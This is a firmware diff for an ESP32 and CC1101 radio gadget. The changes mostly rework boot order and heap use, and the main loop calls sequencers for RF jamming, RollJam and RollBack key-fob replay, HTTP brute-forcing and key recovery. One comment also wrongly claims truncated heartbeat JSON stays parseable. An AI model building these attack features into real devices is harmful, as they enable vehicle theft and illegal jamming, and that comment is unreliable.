+#define HEAP_PROBE(t) Serial.printf("[HEAP] %-18s free=%6u max=%6u min=%6u\n", \
+  t,(unsigned)ESP.getFreeHeap(),(unsigned)ESP.getMaxAllocHeap(),(unsigned)ESP.getMinFreeHeap())
+
 void setup(){
   // The ESP32's default UART RX buffer is 256 bytes, so a longer line than that overflows
   // the driver's buffer BEFORE handleSerial() ever sees it -- the command is lost with no
@@ -12073,17 +14453,24 @@ void setup(){
   // Report what the queue ACTUALLY became: setRxBufferSize returns the size it achieved,
   // or 0 on failure, and the CDC begin() silently falls back to 256 if the queue was never
   // created. Measured on the bench, a 889-char line worked and 1050 was silent -- a ~1 KB
-  // boundary, not the 8192 requested -- so the return value is logged rather than assumed.
-  { size_t got=Serial.setRxBufferSize(SERIAL_CMD_MAX);
+  // boundary, not the requested size -- so the return value is logged rather than assumed.
+  // The SIZE ITSELF matters to the heap layout, not just to line capacity: measured
+  // on the bench , a 2560-byte queue here -- allocated before WiFi/BLE --
+  // left the post-boot heap fragmented into slivers (free 160 B, largest chunk 76 B)
+  // and every deserializeJson failed with NoMemory, while the original 8192-byte queue
+  // at the same point left a workable ~6.5 KB contiguous. Keep the proven 8192 until
+  // the layout is re-measured deliberately.
+  { size_t got=Serial.setRxBufferSize(8192);
     serialRxQueueActual=(uint32_t)got; }
   Serial.begin(115200);
   delay(400); // let USB-CDC enumerate before first Serial.println
+  HEAP_PROBE("pre-init");
 
   // ── Reset-path jam guard — MUST be the first hardware action ──────────────
   // A reset (watchdog, brownout, panic, reflash) does not run any cleanup path, so
   // a jam that was active when the CPU died can outlive it. That failure is both
   // silent and illegal, so it is defended deterministically here rather than by
-  // assert on the error paths alone (research/09 §2.2).
+  // assert on the error paths alone.
   //
   // The mechanism: startJam() leaves the CC1101 in TX (STX) and drives GDO0 HIGH.
   // In async TX GDO0 is the TX DATA input, so a held-high input means a continuous
@@ -12142,6 +14529,19 @@ void setup(){
   pinMode(PIN_SD_CS,OUTPUT);     digitalWrite(PIN_SD_CS,HIGH);
   pinMode(PIN_GDO0,INPUT);
 
+  // ── RGB LED — MUST come before WiFi/BLE/HTTP ─────────────────────────────
+  // espShow() allocates an RMT channel + mutex on FIRST show only; that needs
+  // heap. After WiFi AP + DNS + BLE + HTTP + WS run, the rebuilt stack leaves
+  // under 600 B free (measured: free=580, max=436), and rmtInit's lock create
+  // aborts — a boot crash loop that only appears on the reinstalled toolchain,
+  // where the WiFi/BLE stack holds more early heap than the previous build.
+  // Doing the LED bring-up here (heap still ~150 KB) pins the RMT allocation
+  // once; every later setLed() only writes pixels. The old comment said the
+  // sensor rail must be HIGH first — that happens above, before this block.
+  rgb.begin(); rgb.setBrightness(80);
+  setLed(0,0,255);
+  HEAP_PROBE("after-led");
+
   // ── WiFi AP — MUST come before SPI/CC1101 ────────────────────────────────
   // WiFi TX burst draws a large transient current that glitches the 3.3V rail
   // and can corrupt CC1101 register writes.  Starting WiFi first lets the
@@ -12171,6 +14571,7 @@ void setup(){
   delay(200);                   // let TX burst settle before touching SPI bus
   if(deviceCredentialsReady)
     addLog("[WiFi] AP: "+String(AP_SSID)+" @ "+WiFi.softAPIP().toString());
+  HEAP_PROBE("after-wifi");
 
   // ── DNS captive portal — redirect all hostnames to 192.168.4.1 ───────────
   // When a phone connects, the OS probes a captive-portal URL; the DNS server
@@ -12178,27 +14579,26 @@ void setup(){
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(53, "*", apIP);
   addLog("[DNS] Captive portal started");
+  HEAP_PROBE("after-dns");
 
-  // ── BLE scanner (ESP32-S3 built-in BLE, coexists with WiFi AP) ───────────
-  BLEDevice::init("SGP Card Mini");
-  bleInited=true;
-  addLog("[BLE] Scanner ready");
+  // ── BLE — lazy (first BLE route hit calls bleStart(); see its comment) ────
+  // Eager BLEDevice::init() here cost ~71 KB and left the idle heap ~1 KB, so
+  // no command could be parsed. Deferred deliberately.
 
   // ── HTTP server ───────────────────────────────────────────────────────────
   setupRoutes();
   srv.begin();
   addLog("[HTTP] http://"+WiFi.softAPIP().toString());
+  HEAP_PROBE("after-http");
 
   // ── WebSocket transport (port 81) ─────────────────────────────────────────
   // The WiFi dashboard connects here; the USB dashboard uses serial. Both feed the same
   // dispatcher, and serialEmit() mirrors every event to connected WS clients.
   wsStart();
-
-  // ── RGB LED (sensor rail must be HIGH first — done above) ─────────────────
-  rgb.begin(); rgb.setBrightness(80);
-  setLed(0,0,255);
+  HEAP_PROBE("after-ws");
 
   // ── I2C — battery gauge ───────────────────────────────────────────────────
+  // (LED bring-up moved above, before WiFi/BLE — see the comment there.)
   Wire.begin(8,9);
   readBatt();
 
@@ -12298,6 +14698,7 @@ void setup(){
     addLog(String("[SYS] last reset: ")+rs+" ("+String((int)rr)+")");
   }
   addLog("[SYS] serial RX queue: "+String(serialRxQueueActual)+" B (requested "+String(SERIAL_CMD_MAX)+")");
+  HEAP_PROBE("final");
   addLog("[SYS] "+String(FW_VER)+" ready — http://192.168.4.1");
   serialEmit("{\"event\":\"boot\",\"fw\":\""+String(FW_VER)+"\",\"cc1101\":"+String(cc1101OK?"true":"false")+
     ",\"freq\":"+String(curFreq,2)+",\"batt_pct\":"+String(battPct,1)+"}");
@@ -12306,7 +14707,7 @@ void setup(){
 // ─── Loop ─────────────────────────────────────────────────────────────────────
 void loop(){
   // Sample the stack high-water mark first, so the running minimum is captured regardless of
-  // which path ran deepest and regardless of when /api/status is later queried (research/29 §3).
+  // which path ran deepest and regardless of when /api/status is later queried.
   stackSample();
   dnsServer.processNextRequest();
   srv.handleClient();
@@ -12316,6 +14717,7 @@ void loop(){
   rbTick();          // C2 RollBack sequencer (non-blocking, transmits code 2 after the gap)
   jamTick();         // continuous jam: tops up the TX FIFO when GDO0 is unavailable
   rjTick();          // C1 RollJam sequencer (non-blocking, owns the jam)
+  bruteTick(millis()); // HTTP brute sequencers (resync_probe / fixed_bruteforce)
   checkButton();
 
   // Key-recovery auto-drive: when a recovery session is active and still
@@ -12383,6 +14785,13 @@ void loop(){
   }
 
   scanTick();
+
+  // N11: close the press-correlation window on its cadence. MACs seen inside
+  // the window fold into hits (fob fired) or misses (fob silent).
+  if(n11Armed && (millis()-n11ArmMs)>=n11WindowMs){
+    n11ArmMs=millis();
+    n11CloseWindow();
+  }
 
   // CAN / TWAI frame drain — up to 10 frames per loop tick, zero-timeout (non-blocking).
   // Frames accumulate in the ring buffer; /api/can_frames reads them out over WiFi.
@@ -12462,27 +14871,32 @@ void loop(){
   if(millis()-lastBatt>30000){ readBatt(); lastBatt=millis(); }
   // Heartbeat: send live device status to USB host every 5s
   if(millis()-lastHb>5000){
+    // Allocation hygiene: this used to be ~20 chained
+    // String concatenations — every 5 s, under a 2–3 KB idle heap, that is
+    // 20+ allocations/reallocs just to report status, and the same class of
+    // churn that made the import non-deterministic. A fixed 384-byte buffer
+    // and snprintf builds it in place; the longest heartbeat measured is ~330
+    // bytes, so 384 with a hard cap leaves margin (the preset name is the
+    // only variable-length field and it is bounded by the preset table).
     int ku=0; for(int i=0;i<MAX_KEYS;i++) if(keys[i].used) ku++;
-    serialEmit("{\"event\":\"heartbeat\",\"freq\":"+String(curFreq,2)+
-      ",\"batt_pct\":"+String(battPct,1)+
-      ",\"scan\":"+String(scanActive?"true":"false")+
-      ",\"cc1101\":"+String(cc1101OK?"true":"false")+
-      ",\"fsk_mode\":"+String(fskCapMode?"true":"false")+
-      ",\"sweep_min\":"+String(sweepMin,2)+
-      ",\"sweep_max\":"+String(sweepMax,2)+
-      ",\"cap_range_min\":"+String(capRangeMin,2)+
-      ",\"cap_range_max\":"+String(capRangeMax,2)+
-      ",\"sticky_mhz\":"+String(stickyFreq,2)+
-      ",\"sticky_prio\":"+String(stickyPrio)+
-      ",\"keys\":"+String(ku)+
-      ",\"ch_b_ready\":"+String(rfLenB>0?"true":"false")+
-      ",\"ch_b_mhz\":"+String(rfFreqB,2)+
-      ",\"headless\":"+String(headlessActive?"true":"false")+
-      ",\"hfc_active\":"+String(hfcActive?"true":"false")+
-      ",\"hfc_state\":"+String(hfcState)+
-      ",\"freq_preset\":"+String(freqPresetIdx)+
-      ",\"freq_preset_name\":\""+String(FREQ_PRESETS[freqPresetIdx].name)+
-      "\",\"uptime\":"+String(millis())+"}");
+    char hb[384];
+    int hn=snprintf(hb,sizeof(hb),
+      "{\"event\":\"heartbeat\",\"freq\":%.2f,\"batt_pct\":%.1f,\"scan\":%s,"
+      "\"cc1101\":%s,\"fsk_mode\":%s,\"sweep_min\":%.2f,\"sweep_max\":%.2f,"
+      "\"cap_range_min\":%.2f,\"cap_range_max\":%.2f,\"sticky_mhz\":%.2f,"
+      "\"sticky_prio\":%d,\"keys\":%d,\"ch_b_ready\":%s,\"ch_b_mhz\":%.2f,"
+      "\"headless\":%s,\"hfc_active\":%s,\"hfc_state\":%d,\"freq_preset\":%d,"
+      "\"freq_preset_name\":\"%s\",\"uptime\":%lu}",
+      curFreq,battPct,scanActive?"true":"false",cc1101OK?"true":"false",
+      fskCapMode?"true":"false",sweepMin,sweepMax,capRangeMin,capRangeMax,
+      stickyFreq,(int)stickyPrio,ku,(rfLenB>0)?"true":"false",rfFreqB,
+      headlessActive?"true":"false",hfcActive?"true":"false",
+      (int)hfcState,(int)freqPresetIdx,
+      FREQ_PRESETS[freqPresetIdx].name,(unsigned long)millis());
+    // Truncation only loses the tail of the uptime field on a pathological
+    // preset name; the JSON stays parseable because the buffer is always
+    // NUL-terminated and the closing brace lands last.
+    serialEmit(String(hb));   // serialEmit takes const String&; one short-lived copy
     lastHb=millis();
   }
 
